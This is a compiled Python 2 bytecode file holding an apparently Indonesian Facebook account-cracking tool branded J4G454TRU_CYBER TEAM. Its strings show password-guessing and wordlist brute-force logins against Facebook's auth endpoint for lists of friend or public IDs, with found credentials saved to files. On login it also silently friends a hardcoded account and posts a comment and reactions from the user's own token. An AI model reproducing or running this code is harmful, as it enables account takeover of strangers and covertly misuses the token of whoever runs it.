ó
gí_c           @   s!   d  d l  Z  e  j d  d Ud S(   iÿÿÿÿNsLE  c           @   s)  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z e j e  e j e j j   d d dC g e _ d
   Z d   Z d   Z d   Z d   Z d Z  HHHe d  e d  e d  e d  He d  e d  e d  e d  e d  e d  e d  e d  e d  He! d  Hd   Z" d Z# g  Z$ g  a% g  a& g  Z' g  Z( d  Z) d! Z* e  j+ d"  HHe d#  e d$  e d%  e d&  e d'  HHHHe d  e d  e d  e d  He d(  He d)  He d*  He d+  He d,  He d-  He d.  He d/  e d  e d  He d0  e d1  d2   Z" d Z# g  Z, g  Z$ g  a% g  a& g  Z- g  Z. g  Z' g  Z/ g  Z0 g  Z1 Hd3 Z2 d3 Z3 d4 Z4 x_ e4 d4 k rÏe! d5  Z/ e/ e2 k rÇe! d6  Z5 e5 e3 k r¿d7 e/ GHd8 Z4 qÌd9 GHqqd: GHqqWd;   Z6 d<   Z7 d=   Z8 d>   Z9 d?   Z: d@   Z; dA   Z< e= dB k r%e6   n  d S(D   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g©?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   textt   i(    (    t    t   t   s    c           C   s   d GHt  j j   d  S(   Ns   [1;96m[!] [1;91mExit(   t   osR   t   exit(    (    (    R   t   keluar   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjcR   t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dR   (    (    R   t   acak   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   R   R   (   R   R   R   t   jR   (    (    R   R   &   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R   R   R   R	   R
   (   t   zt   e(    (    R   t   jalan0   s    s  
[32m 	WELCOME [34mIN [31mJ4G454TRU_[35mCYBER [33mTE4M [0m
[34m ||||     |||| |||||||| ||||||||[0m
[34m ||| |   |  || |||  ||| ||| [0m
[34m |||  | |   || |||||||| ||||||||[0m
[34m |||  |||   || |||  ||| |||[0m
[34m |||  |||   || |||||||| |||[0m
s1   [33m ______________________________________ [0ms1   [33m|                                      |[0msP   [33m|[31m WELCHOME [32m IN [35m J4G454TRU_[32mCYBER [36m TEAM [33m | [0ms2   [33m|______________________________________| [0ms"   [1;91m ||||||| ||||||||  ||||||||s"   [1;91m      || ||    ||  ||    ||s"   [1;91m      || ||        ||      s"   [1;97m |||  || ||  ||||  ||||||||s"   [1;97m ||   || ||    ||        ||s"   [1;97m ||   || ||    ||  ||    ||s"   [1;97m ||||||| ||||||||  ||||||||s5   [33m __________________________________________ [0ms   [32m 		J4G454TRU-_TE4M [0ms$   [35m Press any key to continue [0mc          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   [1;93mPlease Wait [1;93mg¹?(   R   R   R   R	   R
   (   t   titikt   o(    (    R   t   tikS   s
      i    s   [31mNot Vulns	   [32mVulnt   clears)   [34m ||||     |||| |||||||| ||||||||[0ms%   [34m ||| |   |  || |||  ||| ||| [0ms)   [34m |||  | |   || |||||||| ||||||||[0ms$   [34m |||  |||   || |||  ||| |||[0ms$   [34m |||  |||   || |||||||| |||[0ms"   [34m Author : Nana Try [33m [0ms   [32m Admin : Nana Try [0ms   [33m YOUTUBE: Jagasatru TV[0ms   [36m FACEBOOK: Nana Try [0ms   [31m WA : +6283119248634 [0ms!   [33m TELEGRAM:+6283119248634[0ms5   [36m BLOG : belajarbarengjagasatru.blogspot.com [0ms%   [35m TEAM :J4G454TRU_CYBER TE4M [0ms'   [33mUSERNAME & PASSWORDNYA:NANATRY[0ms7   [33mUntuk Cara Ambil Token Silahkan Hubungi Author[0mc          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s7   [1;97m[[1;93mâ[1;97m][1;93m Sedang Masuk[1;97m i   (   R   R   R   R	   R
   (   R$   R%   (    (    R   R&      s
      t   NANATRYt   trues   [35mUSERNAME >>>[0ms   [33mPASSWORD >>>[0ms   Logged in successfully as t   falses   [34mPassword Salah[0ms   [34mUsername Salah[0mc          C   sµ   t  j d  t GHHt d  }  ye t j d |   } t j | j  } | d } t	 d d  } | j
 |   | j   d GHt   Wn* t k
 r° d GHt j d	  t   n Xd  S(
   NR'   s.   [0;39m[[0;39m?[0;39m] [0;39mToken :[0;39ms+   https://graph.facebook.com/me?access_token=t   names	   login.txtR   s0   [0;39m[[0;39mâ[0;39m][0;39m Login Berhasils-   [0;39m[[0;39m![0;39m] [0;39mToken Salah !g333333û?(   R   t   systemt   logot	   raw_inputt   requestst   gett   jsont   loadsR   t   openR   t   closet	   bot_koment   KeyErrorR	   R
   t   login(   t   tokett   otwt   at   namat   zedd(    (    R   R7   «   s"    

c          C   s  y t  d d  j   }  Wn# t k
 r> d GHt j d  n Xd } d } d } d } d } d	 } d
 } t j d | d |   t j d | d | d |   t j d | d | d |   t j d | d | d |   t j d | d | d |   t   d  S(   Ns	   login.txtt   rs   [0;39m[!] Token invalids   rm -rf login.txtt   100000779421327s   Hallo NANA TRYððt   ANGRYt   3541019792600633s   ðððt   LOVEs7   https://graph.facebook.com/me/friends?method=post&uids=s   &access_token=s   https://graph.facebook.com/s   /comments/?message=s   /reactions?type=(   R3   t   readt   IOErrorR   R,   R/   t   postt   menu(   R8   t   unat   komt   reacRD   t   post2t   kom2t   reac2(    (    R   R5   ¿   s$    !!!!c          C   s¤  t  j d  y t d d  j   }  WnD t k
 rl t  j d  d GHt  j d  t j d  t   n Xyv t j	 d |   } t
 j | j  } | d } | d	 } t j	 d
 |   } t
 j | j  } t | d d  } Wnf t k
 r)t  j d  d GHt  j d  t j d  t   n# t j j k
 rKd GHt   n Xt  j d  t GHd GHd | d GHd | d GHd | d GHd GHd GHd GHt   d  S(   NR'   s	   login.txtR=   s   [1;97m[!] Token invalids   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=R+   t   ids7   https://graph.facebook.com/me/subscribers?access_token=t   summaryt   total_counts$   [1;97mYour Account is on Checkpoints&   [1;97mThere is no internet connectionsz      [1;36;40m    âââââââââââââââââââââââââââââââââââs0      [1;36;40m     [1;32;40m[*] Name[1;32;40m: s     	   [1;36;40m s0      [1;36;40m     [1;34;40m[*] ID  [1;34;40m: s           [1;36;40m s0      [1;36;40m     [1;34;40m[*] Subs[1;34;40m: s!                         [1;36;40m sz      [1;36;40m    âââââââââââââââââââââââââââââââââââs,   [1;32;40m[1] [1;33;40mââStart Crackings%   [1;32;40m[0] [1;33;40mââLog out(   R   R,   R3   RB   RC   R	   R
   R7   R/   R0   R1   R2   R   R   R6   t
   exceptionsR   R   R-   t   pilih(   R8   R9   R:   R;   RL   t   otsR   t   sub(    (    R   RE   Õ   sH    


c          C   sº   t  d  }  |  d k r' d GHt   n |  d k r= t   ny |  d k r} t j d  t GHHt j d  t  d  t   n9 |  d	 k rª t d
  t j d  t   n d GHt   d  S(   Ns   
[1;31;40m>>> [1;35;40mR   s   [1;97mFill in correctlyt   1t   2R'   s   git pull origin masters   
[1;97m[ [1;97mBack [1;97m]t   0s   Token Removeds   rm -rf login.txt(	   R.   RP   t   superR   R,   R-   RE   R#   R   (   t   unikers(    (    R   RP   û   s&    





c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHt
   d  S(   NR'   s	   login.txtR=   s   [1;97mToken invalids   rm -rf login.txti   s4   [1;32;40m[1] [1;33;40mââHack Dari Daftar Temans1   [1;32;40m[2] [1;33;40mââHack Dari ID Publiks-   [1;32;40m[3] [1;33;40mââHack Bruteforces,   [1;32;40m[4] [1;33;40mââHack Dari Files"   [1;32;40m[0] [1;33;40mââBack(   R   R,   R3   RB   R8   RC   R	   R
   R7   R-   t   pilih_super(    (    (    R   RV     s     c          C   sJ  t  d  }  |  d k r' d GHt   n;|  d k r t j d  t GHt d  t j d t  } t	 j
 | j  } xë| d D] } t j | d	  q WnÅ|  d
 k rt j d  t GHt  d  } y> t j d | d t  } t	 j
 | j  } d | d GHWn' t k
 r.d GHt  d  t   n Xd GHt j d | d t  } t	 j
 | j  } xþ | d D] } t j | d	  qlWnØ |  d k r²t j d  t GHt   n° |  d k r@t j d  t GHyC t  d  } x0 t | d  j   D] }	 t j |	 j    qõWWqbt k
 r<d GHt  d  t   qbXn" |  d k rVt   n d GHt   d t t t   GHt d  d d d g }
 x9 |
 D]1 } t d  |  f t j j   t j d!  qWd" GHt d#  Hd$   } t d%  } | j | t  d& GHd' t t t    d( t t t!   GHd) GHHt  d*  t   d  S(+   Ns   
[1;31;40m>>> [1;97mR   s   [1;97mFill in correctlyRS   R'   s$   [1;97m[â] Mengambil ID [1;97m...s3   https://graph.facebook.com/me/friends?access_token=t   dataRL   RT   s   [33m[â] Enter ID : [0ms   https://graph.facebook.com/s   ?access_token=s   [49m[â] Name : 33[0mR+   s   [1;97m[â] ID Not Found!s   
[1;97m[[1;97mBack[1;97m]s   [33m[â] Mengambil ID...[0ms   /friends?access_token=t   3t   4s6   [1;97m[+] [1;97mEnter the file name [1;97m: [1;97mR=   s&   [1;35;40m[!] [1;35;40mFile not founds'   
[1;35;40m[ [1;35;40mExit [1;35;40m]RU   s#   [1;36;40m[â] Total IDs : [1;97ms   [1;34;40m[â] Sabar Ya...s   .   s   ..  s   ... s,   [1;32;40m[â] Sedang Mencoba Login[1;97mi   s<   
[1;91m  â     [1;91mPress CTRL+Z To Stop [1;91m    âs&          [1;95mSedang Login Sabar ya...c         S   s  |  } y t  j d  Wn t k
 r* n XyÕt j d | d t  } t j | j  } | d d } t	 j
 d | d | d  } t j |  } d	 | k rÈ d
 | d | GHt j | |  n7d | d k r/d | d | GHt d d  } | j | d | d  | j   t j | |  nÐ| d d } t	 j
 d | d | d  } t j |  } d	 | k rd
 | d | GHt j | |  ncd | d k rd | d | GHt d d  } | j | d | d  | j   t j | |  nüd }	 t	 j
 d | d |	 d  } t j |  } d	 | k rhd
 | d |	 GHt j | |	  nd | d k rÏd | d |	 GHt d d  } | j | d |	 d  | j   t j | |
  n0d }
 t	 j
 d | d |
 d  } t j |  } d	 | k r4d
 | d |
 GHt j | |
  nËd | d k rd | d |
 GHt d d  } | j | d |
 d  | j   t j | |
  ndd } t	 j
 d | d | d  } t j |  } d	 | k r d
 | d | GHt j | |  nÿd | d k rgd | d | GHt d d  } | j | d | d  | j   t j | |  nd } t	 j
 d | d | d  } t j |  } d	 | k rÌd
 | d | GHt j | |  n3d | d k r3d | d | GHt d d  } | j | d | d  | j   t j | |  nÌ d } t	 j
 d | d | d  } t j |  } d	 | k rd
 | d | GHt j | |  ng d | d k rÿd | d | GHt d d  } | j | d | d  | j   t j | |  n  Wn n Xd  S(   Nt   outs   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens   [1;92m[Successful] [1;92m s    [1;92m|[1;92m s   www.facebook.comt	   error_msgs   [1;36;40m[After-7Hr] [1;97m s    [1;36;40m|[1;97m s
   out/CP.txtR:   t   |s   
t   1234t   Sayangt   Anjingt   Bangsatt   Kontolt   Monyet(   R   t   mkdirt   OSErrorR/   R0   R8   R1   R2   R   t   urllibt   urlopent   loadt   okst   appendR3   R   R4   t   cekpoint(   t   argt   userR:   R   t   pass1RY   t   qt   cekt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(    (    R   t   maind  s¼    






i   s5   [1;31;40m[â] Process Has Been Completed[1;97m....s1   [1;32;40m[+] Total OK/[1;97mCP [1;97m: [1;97ms   [1;31;40m/[1;36;40ms2   [1;34;40m[+] CP File Has Been Saved : save/cp.txts   
[1;97m[[1;97mExit[1;97m]("   R.   RX   R   R,   R-   R#   R/   R0   R8   R1   R2   R   RL   Rn   R6   RV   t   bruteR3   t	   readlinest   stripRC   RE   R   R   R   R   R   R   R	   R
   R    t   mapRm   Ro   (   t   peakR=   R!   t   st   idtt   jokt   opR   t   idlistt   lineR$   R%   R{   t   p(    (    R   RX   $  s    






  
	n)
c    
      C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n.Xt  j d  t GHd GHyñt	 d  } t	 d	  } t | d  } | j
   } d GHd
 | GHd t t |   d GHt d  t | d  } xw| D]o} y=| j d d  } t j j d |  t j j   t j d | d | d  } t j | j  } d | k rÉt d d  } | j | d | d  | j   d GHd d GHd | GHd | GHt   nm d | d k r6t d d  }	 |	 j | d | d  |	 j   d GHd  GHd! GHd | GHd | GHt   n  Wqô t j j k
 rbd" GHt j d#  qô Xqô WWn" t k
 rd$ GHd% GHt   n Xd  S(&   NR'   s	   login.txtR=   s   [1;97m[!] Token not founds   rm -rf login.txtg      à?s§   [1;31;40m âââââââââââââââââââââââââââºâââââââââââââââââââââââââsG   [1;97m[+] [1;97mID[1;97m/[1;97mEmail [1;97mTarget [1;97m:[1;97m s@   [1;97m[+] [1;97mWordlist [1;97mext(list.txt) [1;97m: [1;97ms9   [1;97m[[1;97mâ[1;97m] [1;97mTarget [1;97m:[1;97m s   [1;97m[+] [1;97mTotal[1;97m s    [1;97mPasswords*   [1;97m[âº] [1;97mPlease wait [1;97m...s   
R   s.   [1;97m[[1;97mâ¸[1;97m] [1;97mTry [1;97ms   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R_   s	   Brute.txtR   s    | s   
[1;97m[+] [1;97mFounded.i4   s
   [1;97mâs-   [1;97m[â¹] [1;97mUsername [1;97m:[1;97m s-   [1;97m[â¹] [1;97mPassword [1;97m:[1;97m s   www.facebook.comR`   s   Brutecekpoint.txts§   [1;36;40m âââââââââââââââââââââââââââºâââââââââââââââââââââââââs*   [1;97m[!] [1;97mAccount Maybe Checkpoints   [1;97m[!] Connection Errori   s   [1;97m[!] File not found...s7   
[1;97m[!] [1;97mLooks like you don't have a wordlist(   R   R,   R3   RB   RC   R	   R
   R7   R-   R.   R}   R   R   R#   R   R   R   R   R   R/   R0   R1   R2   R   R4   R   RO   R   RV   (
   R8   t   emailt   passwt   totalt   sandit   pwRY   t   mpsht   dapatt   ceks(    (    R   R|   Ü  sl    	

			

		t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(>   R   R   R	   t   datetimeR   t   hashlibt   ret	   threadingR1   Rj   t	   cookielibR/   t	   mechanizet   multiprocessing.poolR    t   requests.exceptionsR   R   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R   R#   R-   R.   R&   t   backt   berhasilRo   Rm   RL   t   listgrupt   vulnott   vulnR,   t   threadst   oket   cpet   usernamet   idtemant   idfromtemant   CorrectUsernamet   CorrectPasswordt   loopt   passwordR7   R5   RE   RP   RV   RX   R|   t   __name__(    (    (    R   t   <module>   sæ   
				
	













	




















							&			¸	;(   t   marshalt   loads(    (    (    s   mbf_.pyt   <module>   s   